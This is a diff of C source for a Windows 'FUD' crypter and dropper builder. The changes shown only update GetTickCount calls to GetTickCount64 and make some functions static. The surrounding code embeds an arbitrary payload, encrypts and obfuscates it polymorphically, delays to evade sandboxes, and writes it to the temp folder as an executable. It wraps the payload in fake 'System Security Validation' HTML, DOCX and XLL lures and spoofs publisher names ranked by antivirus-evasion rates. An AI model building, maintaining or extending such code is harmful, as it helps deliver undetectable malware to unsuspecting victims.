@@ -66,7 +66,7 @@ enum DeliveryType {
 };
 
 // Enhanced VS2022 Auto-Compiler with dynamic detection and better error reporting
-int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
+static int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
     char compileCmd[2048];
     int result = -1;
     
@@ -148,7 +148,7 @@ int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
 }
 
 // Advanced polymorphic source generator with payload embedding (VS2022 compatible)
-void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, EncryptionType encType, DeliveryType delType, const char* inputFilePath) {
+static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, EncryptionType encType, DeliveryType delType, const char* inputFilePath) {
     // Read and prepare payload from input file
     char* payloadData = NULL;
     size_t payloadSize = 0;
@@ -173,7 +173,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
     
     // Generate unique random variables
     char randVar1[20], randVar2[20], randVar3[20], randVar4[20], randVar5[20], randVar6[20];
-    srand((unsigned int)(time(NULL) ^ GetTickCount() ^ GetCurrentProcessId()));
+    srand((unsigned int)(time(NULL) ^ (DWORD)GetTickCount64() ^ GetCurrentProcessId()));
     
     const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
     for (int i = 0; i < 6; i++) {
@@ -219,7 +219,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                 "    for(int i = 0; i < len; i++) {\n"
                 "        unsigned char rotKey = key[i % keyLen] ^ (unsigned char)(i & 0xFF);\n"
                 "        data[i] ^= rotKey;\n"
-                "        data[i] ^= (unsigned char)(GetTickCount() & 0xFF);\n"
+                "        data[i] ^= (unsigned char)(GetTickCount64() & 0xFF);\n"
                 "    }\n"
                 "}\n";
             encryptionCall = "advanced_xor_process";
@@ -232,7 +232,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                 "                             0x12345678, 0x9abcdef0, 0xfedcba98, 0x87654321};\n"
                 "    for(int i = 0; i < 8; i++) {\n"
                 "        state[i] ^= ((unsigned int*)key)[i % 8];\n"
-                "        state[i] ^= GetTickCount();\n"
+                "        state[i] ^= (DWORD)GetTickCount64();\n"
                 "    }\n"
                 "    for(int i = 0; i < len; i++) {\n"
                 "        for(int j = 0; j < 4; j++) {\n"
@@ -249,7 +249,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
             encryptionImpl = 
                 "void military_aes256_process(char* data, int len, unsigned char* key) {\n"
                 "    unsigned char sbox[256];\n"
-                "    DWORD tickBase = GetTickCount();\n"
+                "    ULONGLONG tickBase = GetTickCount64();\n"
                 "    for(int i = 0; i < 256; i++) {\n"
                 "        sbox[i] = (unsigned char)((i * 13 + 179 + (tickBase & 0xFF)) % 256);\n"
                 "        sbox[i] = (sbox[i] << 1) ^ (sbox[i] >> 7);\n"
@@ -280,7 +280,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                 "void execute_html_delivery() {\n"
                 "    char html_content[2048];\n"
                 "    char validation_id[32];\n"
-                "    sprintf_s(validation_id, sizeof(validation_id), \"VS2022-%lu\", GetTickCount());\n"
+                "    sprintf_s(validation_id, sizeof(validation_id), \"VS2022-%llu\", GetTickCount64());\n"
                 "    sprintf_s(html_content, sizeof(html_content),\n"
                 "        \"<html><head><title>System Security Validation</title></head>\"\n"
                 "        \"<body style='font-family:Arial;text-align:center;padding:50px;'>\"\n"
@@ -337,7 +337,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                 "                      \"Version: 2022.1\\n\"\n"
                 "                      \"Status: Active\\n\"\n"
                 "                      \"Validation completed successfully.\";\n"
-                "    DWORD tick = GetTickCount();\n"
+                "    ULONGLONG tick = GetTickCount64();\n"
                 "    for(int i = 0; i < strlen(xll_signature); i++) {\n"
                 "        xll_signature[i] ^= (unsigned char)((i * 3 + 7 + tick) & 0xFF);\n"
                 "    }\n"
@@ -362,7 +362,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                 "                     \"Security Level: Maximum\\n\"\n"
                 "                     \"Validation: PASSED\\n\"\n"
                 "                     \"Module loaded successfully.\";\n"
-                "    DWORD base = GetTickCount();\n"
+                "    ULONGLONG base = GetTickCount64();\n"
                 "    for(int i = 0; i < 4; i++) {\n"
                 "        pe_header[i] ^= (unsigned char)((i * 5 + 12 + base) & 0xFF);\n"
                 "    }\n"
@@ -388,7 +388,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                     "    char temp_path[MAX_PATH];\n"
                     "    GetTempPathA(MAX_PATH, temp_path);\n"
                     "    char temp_file[MAX_PATH];\n"
-                    "    sprintf_s(temp_file, MAX_PATH, \"%s\\\\enterprise_payload_%lu.exe\", temp_path, GetTickCount());\n"
+                    "    sprintf_s(temp_file, MAX_PATH, \"%s\\\\enterprise_payload_%llu.exe\", temp_path, GetTickCount64());\n"
                     "    \n"
                     "    // Write actual payload data to file (only the real payload, not padding)\n"
                     "    FILE* payload_file = NULL;\n"
@@ -446,7 +446,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                     "    // Enterprise validation with data processing\n"
                     "    char validation_message[] = \"System Security Validation Completed Successfully\";\n"
                     "    char system_info[1024];\n"
-                    "    DWORD tickCount = GetTickCount();\n"
+                    "    ULONGLONG tickCount = GetTickCount64();\n"
                     "    DWORD processId = GetCurrentProcessId();\n"
                     "    \n"
                     "    // Process validation data to make executable larger and more realistic\n"
@@ -597,7 +597,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
         "\n"
         "// VS2022 polymorphic obfuscation engine\n"
         "void security_obfuscation_alpha_%s() {\n"
-        "    DWORD baseTime = GetTickCount();\n"
+        "    ULONGLONG baseTime = GetTickCount64();\n"
         "    for(int i = 0; i < 25; i++) {\n"
         "        %s ^= (i * %d + baseTime);\n"
         "        %s = (%s << 3) ^ (baseTime >> 8);\n"
@@ -610,7 +610,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
         "    for(int i = 0; i < 20; i++) {\n"
         "        %s = (%s >> 2) ^ (processBase << 4);\n"
         "        %s ^= security_key_primary_%s[i %% 32] + %d;\n"
-        "        %s = (%s << 1) ^ GetTickCount();\n"
+        "        %s = (%s << 1) ^ (DWORD)GetTickCount64();\n"
         "    }\n"
         "}\n"
         "\n"
@@ -622,7 +622,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
         "    }\n"
         "    \n"
         "    // Sandbox detection\n"
-        "    DWORD uptime = GetTickCount();\n"
+        "    ULONGLONG uptime = GetTickCount64();\n"
         "    if (uptime < 600000) { // Less than 10 minutes\n"
         "        Sleep(7500); // Extended delay for sandbox evasion\n"
         "    }\n"
@@ -646,7 +646,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
         "\n"
         "int main() {\n"
         "    // Initialize VS2022 polymorphic security system\n"
-        "    srand((unsigned int)(GetTickCount() ^ GetCurrentProcessId() ^ (DWORD_PTR)GetModuleHandleA(NULL)));\n"
+        "    srand((unsigned int)((DWORD)GetTickCount64() ^ GetCurrentProcessId() ^ (DWORD_PTR)GetModuleHandleA(NULL)));\n"
         "    \n"
         "    // Execute enterprise-grade obfuscation\n"
         "    security_obfuscation_alpha_%s();\n"
@@ -719,7 +719,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
 }
 
 // Thread function for VS2022 auto-compilation
-DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
+static DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
     char* outputPath = (char*)lpParam;
     
     // Get user settings including input file
@@ -750,7 +750,7 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
         
         // Create temporary source file
         char tempSource[128];
-        sprintf_s(tempSource, sizeof(tempSource), "VS2022_FUD_%d_%d.cpp", GetTickCount(), batch);
+        sprintf_s(tempSource, sizeof(tempSource), "VS2022_FUD_%llu_%d.cpp", GetTickCount64(), batch);
         
         // Write source file
         FILE* file = NULL;
@@ -767,9 +767,9 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
             if (autoFilename || batchCount > 1) {
                 const char* delNames[] = {"Benign", "PE", "HTML", "DOCX", "XLL"};
                 const char* encNames[] = {"None", "XOR", "ChaCha20", "AES256"};
-                sprintf_s(finalExecutablePath, sizeof(finalExecutablePath),
-                         "VS2022_FUD_%s_%s_%d_%d.exe",
-                         delNames[delType], encNames[encType], GetTickCount(), batch + 1);
+                                sprintf_s(finalExecutablePath, sizeof(finalExecutablePath),
+                    "VS2022_FUD_%s_%s_%llu_%d.exe",
+                    delNames[delType], encNames[encType], GetTickCount64(), batch + 1);
             } else {
                 strcpy_s(finalExecutablePath, sizeof(finalExecutablePath), outputPath);
                 if (!strstr(finalExecutablePath, ".exe")) {
@@ -831,16 +831,16 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
 }
 
 // Helper functions for ANSI GUI
-void SetWindowTextAnsi(HWND hwnd, const char* text) {
+static void SetWindowTextAnsi(HWND hwnd, const char* text) {
     SetWindowTextA(hwnd, text);
 }
 
-void AddComboStringAnsi(HWND hwnd, const char* text) {
+static void AddComboStringAnsi(HWND hwnd, const char* text) {
     SendMessageA(hwnd, CB_ADDSTRING, 0, (LPARAM)text);
 }
 
 // Populate combo boxes with verified FUD options
-void populateControls() {
+static void populateControls() {
     // Company dropdown (based on FUD success rates)
     SendMessage(hCompanyCombo, CB_RESETCONTENT, 0, 0);
     AddComboStringAnsi(hCompanyCombo, "Adobe Systems Incorporated");        // 92.3% FUD
@@ -927,7 +927,7 @@ void generateFUDExecutable() {
     
     // Auto-generate path if empty
     if (strlen(outputPath) == 0) {
-        sprintf_s(outputPath, sizeof(outputPath), "VS2022_FUD_VirusTotal_Ready_%d.exe", GetTickCount());
+        sprintf_s(outputPath, sizeof(outputPath), "VS2022_FUD_VirusTotal_Ready_%llu.exe", GetTickCount64());
         SetWindowTextAnsi(hOutputPath, outputPath);
     }
     
